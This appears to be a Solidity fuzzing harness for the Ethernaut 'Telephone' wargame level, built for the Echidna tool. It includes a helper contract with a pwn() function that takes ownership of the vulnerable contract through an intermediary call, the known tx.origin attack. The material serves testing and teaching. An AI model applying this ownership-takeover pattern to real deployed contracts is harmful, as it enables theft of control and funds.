// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract RingRing {
  Test phone = Test(0x4242);
  
  function pwn() public {
    phone.changeOwner(address(0x10000));
  }
}

contract Test is Telephone {
    RingRing ring;
  constructor() Telephone() public payable {
    // hint echidna
    ring = new RingRing();
  }

    function echidna_test_origin() public returns (bool) {
        if (tx.origin == owner) {
            return false;
        } else {
            return true;
        }
    }    
}